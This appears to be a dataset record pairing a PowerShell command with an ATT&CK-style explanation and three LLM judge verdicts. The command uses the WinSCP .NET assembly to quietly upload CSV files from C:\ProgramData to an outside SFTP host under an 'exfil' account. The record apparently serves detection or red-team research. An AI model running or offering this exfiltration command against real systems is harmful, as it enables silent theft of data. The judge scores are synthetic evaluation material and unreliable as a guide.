command: [Reflection.Assembly]::LoadFile('C:\Program Files (x86)\WinSCP\WinSCPnet.dll') | Out-Null; $so=New-Object WinSCP.SessionOptions -Property @{ Protocol=[WinSCP.Protocol]::Sftp; HostName='192.0.2.10'; UserName='exfil'; Password='S3cr3t!'; SshHostKeyFingerprint='ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }; $s=New-Object WinSCP.Session; $s.Open($so); $to=New-Object WinSCP.TransferOptions; $to.ResumeSupport.State=[WinSCP.TransferResumeSupportState]::On; $s.PutFiles('C:\ProgramData\*.csv','/data/',$false,$to) | Out-Null; $s.Dispose() 2>$null
explanation: Uses the WinSCP .NET assembly from PowerShell to programmatically exfiltrate CSV files over SFTP with resume support and no console output.
rationale_steps: Create session options with host key pinning
Open session and configure transfer options
Upload matching files and dispose session silently

llm_judgments.syntactic_justification: The PowerShell chain has balanced quotes/braces, valid semicolon separators, and correctly references WinSCP .NET types, methods, and properties.
llm_judgments.semantic_justification: It programmatically uploads CSVs via SFTP using WinSCP with resume support (matching automated exfiltration), though the test IP/fingerprint and limited error suppression slightly reduce operational plausibility.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct object instantiation syntax, proper method calls, and appropriate error redirection.
llm_judgments.semantic_justification: The command fully implements automated exfiltration by loading the WinSCP .NET assembly, establishing an SFTP connection with credentials, and transferring CSV files to a remote server with resume capability and error suppression, aligning perfectly with the T1020 technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax for .NET reflection, object creation, property assignment, method calls, and output redirection.
llm_judgments.semantic_justification: The command perfectly achieves the claimed intent of programmatically exfiltrating CSV files over SFTP using the WinSCP .NET assembly, directly aligning with the T1020 Automated Exfiltration technique.
